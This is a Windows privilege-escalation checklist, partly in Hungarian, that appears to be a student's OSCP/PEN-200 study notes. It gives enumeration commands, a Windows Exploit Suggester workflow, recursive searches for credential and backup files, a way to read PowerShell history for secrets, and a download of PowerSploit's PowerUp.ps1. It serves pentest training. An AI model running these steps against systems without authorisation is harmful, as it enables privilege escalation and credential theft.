# Windows Privilege Escalation Checklist
## Situational Awareness
* Hostname, username, current user - privileges and group memberships, current dir, common dirs, etc...
  * hostname
  * whoami
  * whoami /priv
  * whoami /groups
  * cd, dir, dir C:\, dir C:\Users, tree /F
* Existing users and groups
  * net user
  * net user User1
  * net localgroup
  * net localgroup Administrators
  * query user
* Operating system, version and architecture
  * systeminfo
  * ver
* Network information
  * ipconfig /all
  * netstat -ano
  * route print
  * arp -a
* Shared resources (not only folders, but printers and other hosts too through SMB)
  * net share
  * net view
* Running processes
  * tasklist
  * tasklist /svc
* Installed applications
  * WMIC
    * C:\> wmic [ENTER] product get name, version [ENTER]
    * varni kell egy kicsit, nem ad egybol eredmenyt
    * lehet erdemes redirectelni az eredmenyt egy file-ba (product get name, version > output.txt)
  * Powershell
  <pre>
  PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  </pre>
  * Listing C - Program Files folders
    * C:\> dir "C:\Program Files"
    * C:\> dir "C:\Program Files (x86)"
## Windows Exploit Suggester
### info
* Source: (sajnos nincs meg hogy honnan szedtuk, de python file, az tuti)
* ennyi info van rola, a file header reszeben
<pre>
# Windows Exploit Suggester
# revision 3.3, 2017-02-13
#
# author: Sam Bertram, Gotham Digital Science
# contact: labs@gdssecurity.com,sbertram@gdssecurity.com,sammbertram@gmail.com
# blog post: "Introducing Windows Exploit Suggester", http://blog.gdssecurity.com/
# Blog Post: "Introducing Windows Exploit Suggester", https://blog.gdssecurity.com/labs/2014/7/11/introducing-windows-exploit-suggester.html
</pre>
### method
<pre>
<b># victim machine</b>
C:\> systeminfo
(copy output to a txt file on attack machine)

<b># attack machine</b>
$ ./windows-exploit-suggester.py --update
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt
</pre>
## File permissions
* cmd
<pre>
C:\> icacls "C:\Users\user1\desktop\test.exe"
C:\Users\user1\desktop\test.exe
BUILTIN\Administrators:(F)
NT AUTHORITY\SYSTEM:(F)
BUILTIN\Users:(RX)
NT AUTHORITY\Authenticated Users:(RX)
Successfully processed 1 files; Failed processing 0 files
</pre>
* powershell
<pre>
PS> Get-Acl "C:\Users\user1\desktop\test.exe"
...
</pre>
## Searching Files and Folders
* Searching files by extension
<pre>
PS> Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.conf,*.xml,*.json,*.yml,*.yaml,*.kdbx,*.bak,*.bck,*.old -File -Recurse -ErrorAction SilentlyContinue
PS> Get-ChildItem -Path C:\ -Include *.bat,*.vbs,*.js,*.asp,*.aspx,*.js,*.ps1,*.psm1,*.php,*.jar,*.jsp -File -Recurse -ErrorAction SilentlyContinue
PS> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.xlsm,*.doc,*.docx,*.docm,*.ppt,*.pptx -File -Recurse -ErrorAction SilentlyContinue
PS> Get-ChildItem -Path C:\ -Include *.rar,*.zip,*.iso,*.tar,*.7z -File -Recurse -ErrorAction SilentlyContinue
</pre>
* Searching 'modifiable service files' (with Powersploit's PowerUp.ps1)
<pre>
PS> Invoke-WebRequest -Uri "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" -OutFile .\PowerUp.ps1
PS> Import-Module .\PowerUp.ps1
PS> Get-ModifiableServiceFile
</pre>
## Powershell history
<pre>
PS> Get-History

PS> (Get-PSReadlineOption).HistorySavePath
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</pre>
## Service Binary Hijacking
* PEN200.pdf 500. oldal...
## Service DLL Hijacking
* PEN200.pdf 507. oldal...
## Unquoted Service Paths
* PEN200.pdf 514. oldal...
## Scheduled Tasks
* PEN200.pdf 520. oldal...
## Common vulnerabilites and exploits
* Juicy Potato
* Printspoofer
* 
## Usefull sources
* Relevant HTB Academy modules
  * Active Directory Enumeration & Attacks
  * Windows Fundamentals
  * Introduction To Windows Command Line
  * Windows Privilege Escalation
* Other sources
  * PEN200.pdf (OSCP guide)
